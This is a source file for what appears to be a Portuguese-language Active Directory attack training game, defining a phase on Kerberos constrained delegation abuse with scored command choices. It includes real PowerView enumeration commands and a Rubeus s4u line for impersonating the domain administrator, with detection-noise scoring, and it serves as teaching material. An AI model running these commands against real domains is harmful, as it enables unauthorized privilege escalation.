import type { PhaseDefinition } from "./types";

export const phase09: PhaseDefinition = {
  number: 9,
  technicalName: "Delegation Abuse",
  thematicName: "Abuso de delegação constrained na conta de telemetria",
  objective:
    "Identificar a delegação constrained explorável e planejar a impersonação via S4U2Self / S4U2Proxy.",
  context: ds =>
    [
      `🔗 Delegação Kerberos é o "Cavalo de Tróia" que o próprio DC cede de graça quando mal configurada.`,
      `   A conta ${ds.delegationTarget.account} carrega delegação ${ds.delegationTarget.type}`,
      `   apontada para ${ds.delegationTarget.target} — alguém configurou para "funcionar" um caso de integração`,
      `   e nunca revisitou.`,
      ``,
      `🎯 Com a senha que você quebrou, é possível chamar S4U2Self + S4U2Proxy e pedir ao DC um TGS`,
      `   em nome do administrator, válido para esse serviço. Ou seja: dá para se apresentar como admin`,
      `   sem nunca ter conhecido a senha do admin.`,
      ``,
      `👉 Comando esperado: Get-DomainComputer`,
      `   (caminho alternativo: enumerar delegação unconstrained — mais barulhento e exige coerção SMB)`
    ].join("\n"),
  expectedCommand: "Get-DomainComputer",
  options: [
    {
      id: "a",
      text: "Get-DomainComputer -TrustedToAuth -Properties msds-allowedtodelegateto",
      correct: true,
      response: ds =>
        [
          `name                              msds-allowedtodelegateto`,
          `--------------------------------- -------------------------------------------`,
          `${ds.delegationTarget.account.padEnd(33)} ${ds.delegationTarget.target}`,
          ``,
          `[+] Constrained delegation confirmada. Próximo passo: Rubeus s4u`,
          `    /user:${ds.delegationTarget.account.replace("$", "")} /rc4:<NTLM> /impersonateuser:administrator /msdsspn:${ds.delegationTarget.target}`
        ].join("\n"),
      scoreDelta: 1.4,
      detectionDelta: 5,
      budgetDelta: -6,
      unlockEvidences: ds => [
        {
          label: "Constrained delegation explorável",
          payload: ds.delegationTarget
        }
      ],
      flag: ds => ds.flags.p9
    },
    {
      id: "b",
      text: "Get-DomainComputer -Unconstrained",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `name`,
          `--------------------------------`,
          `${ds.hosts.find(h => h.unconstrainedDelegation)?.hostname ?? "netops-jump-01"}`,
          ``,
          `[+] Unconstrained delegation localizada — caminho alternativo via Printer Bug / coerção SMB.`,
          `[!] Mais ruidoso (gera tráfego SMB-coerce) e exige host adicional comprometido.`
        ].join("\n"),
      scoreDelta: 0.6,
      detectionDelta: 9,
      budgetDelta: -6,
      unlockEvidences: ds => [
        { label: "Unconstrained delegation localizada", payload: ds.delegations[0] }
      ]
    },
    {
      id: "c",
      text: "Get-ADComputer -Filter * -Properties ms-DS-MachineAccountQuota",
      correct: false,
      response: () =>
        "MAQ é interessante para Resource-Based Constrained Delegation, mas não cumpre objetivo desta fase (constrained clássica já localizada).",
      scoreDelta: -0.2,
      detectionDelta: 3,
      budgetDelta: -3
    },
    {
      id: "d",
      text: "Get-DomainComputer -Identity '*' -Properties *",
      correct: false,
      response: () => "Dump amplo, alto ruído, baixo valor incremental.",
      scoreDelta: -0.5,
      detectionDelta: 15,
      budgetDelta: -5
    },
    {
      id: "e",
      text: "klist purge",
      correct: false,
      response: () => "Limpa a cache local de tickets — não enumera delegações.",
      scoreDelta: -0.3,
      detectionDelta: 1,
      budgetDelta: -1
    }
  ],
  techExplanation:
    "Delegações: Unconstrained guarda TGT de quem autentica; Constrained (msDS-AllowedToDelegateTo) permite S4U2Proxy a serviços específicos; RBCD usa msDS-AllowedToActOnBehalfOfOtherIdentity no recurso."
};
